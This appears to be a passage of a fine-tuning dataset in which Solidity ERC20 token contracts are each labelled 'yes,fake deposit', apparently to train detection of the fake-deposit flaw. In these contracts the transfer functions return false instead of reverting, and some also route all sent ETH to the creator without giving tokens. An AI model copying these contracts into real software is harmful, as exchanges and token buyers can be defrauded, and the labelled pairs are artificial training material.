}\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract RicoContract is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 500000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000000000; // Update total supply (100000 for example)\n name = \"RicoCoin\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"RICO\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract JapaneseChin is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'Chin.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function JapaneseChin() {\n balances[msg.sender] = 10000000000000000000000000000; \n totalSupply = 10000000000000000000000000000;\n name = \"Japanese Chin\";\n decimals = 18; \n symbol = \"Chin\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Sienna is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 10000000*10**uint256(decimals);\n string public constant name = \"Sienna\";\n string public constant symbol = \"SIENNA\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract NigerianEkuke is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'EKUKE1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function NigerianEkuke() {\n balances[msg.sender] = 1000000000000000000000000000000; \n totalSupply = 1000000000000000000000000000000;\n name = \"Nigerian Ekuke\";\n decimals = 18; \n symbol = \"EKUKE\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\npragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n\n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract STToken is UnboundedRegularToken {\n\n uint public totalSupply = 33*10**25;\n uint8 constant public decimals = 18;\n string constant public name = \"StarToken\";\n string constant public symbol = \"ST\";\n\n function STToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 2000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply =2000000000000000000000000000; // Update total supply (100000 for example)\n name = \"MSC BLUME\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"MRC\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\ninterface ERC20Interface {\n\n function totalSupply() external view returns (uint256);\n\n function balanceOf(address account) external view returns (uint256);\n\n function transfer(address recipient, uint256 amount) external returns (bool);\n\n function allowance(address owner, address spender) external view returns (uint256);\n\n function approve(address spender, uint256 amount) external returns (bool);\n\n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n event Transfer(address indexed from, address indexed to, uint256 value);\n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract SYSP is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n\n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000000000000000000000000; // Update total supply (100000 for example)\n name = \"DOG COLLAR\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"COLLAR\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: MIT\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract FacebookToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"Facebook Token\";\n string public constant symbol = \"FACE\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract KitsuneInu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Kitsune Inu\";\n string public constant symbol = \"KITSUNE\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
